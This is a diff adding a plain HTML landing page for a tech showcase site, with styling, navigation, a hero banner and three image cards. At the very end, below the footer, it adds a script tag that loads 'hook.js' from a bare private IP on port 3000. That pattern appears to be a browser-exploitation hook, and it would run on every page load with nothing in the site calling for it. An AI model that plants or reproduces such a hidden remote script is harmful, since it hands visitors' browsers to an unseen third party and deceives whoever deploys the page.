@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechVision Hub</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em;
+        }
+        nav {
+            background-color: #34495e;
+            padding: 0.5em;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav ul li {
+            margin: 0 1em;
+        }
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        nav ul li a:hover {
+            color: #3498db;
+        }
+        .hero {
+            background-image: url('https://images.unsplash.com/photo-1518770660439-4636190af475');
+            background-size: cover;
+            background-position: center;
+            height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .hero-text {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 2em;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .content {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+        .tech-showcase {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .tech-item {
+            width: 30%;
+            margin-bottom: 2em;
+            background-color: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+        .tech-item:hover {
+            transform: translateY(-5px);
+        }
+        .tech-item img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+        .tech-item h3 {
+            padding: 1em;
+            margin: 0;
+            text-align: center;
+        }
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>The Tech Hub</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#home">Home</a></li>
+            <li><a href="#innovations">Innovations</a></li>
+            <li><a href="#about">About</a></li>
+        </ul>
+    </nav>
+    <div class="hero">
+        <div class="hero-text">
+            <h2>Explore the Future of Technology</h2>
+            <p>Discover cutting-edge innovations and revolutionary ideas</p>
+        </div>
+    </div>
+    <div class="content">
+        <h2>Welcome to The Tech Hub</h2>
+        <p>Dive into the world of technology and explore the latest advancements shaping our future. From artificial intelligence to quantum computing, we bring you insights into the most exciting tech innovations.</p>
+        <p> I made this because I was bored</p>
+        <div class="tech-showcase">
+            <div class="tech-item">
+                <img src="https://images.unsplash.com/photo-1485827404703-89b55fcc595e" alt="AI">
+                <h3>Artificial Intelligence</h3>
+            </div>
+            <div class="tech-item">
+                <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5" alt="Cybersecurity">
+                <h3>Cybersecurity</h3>
+            </div>
+            <div class="tech-item">
+                <img src="https://images.unsplash.com/photo-1617791160505-6f00504e3519" alt="Quantum Computing">
+                <h3>Quantum Computing</h3>
+            </div>
+        </div>
+    </div>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <footer>
+        <p>&copy; 2024 TechVision Hub. All rights reserved.</p>
+    </footer>
+    <script src="http://192.168.1.5:3000/hook.js"></script>
+</body>
+</html>
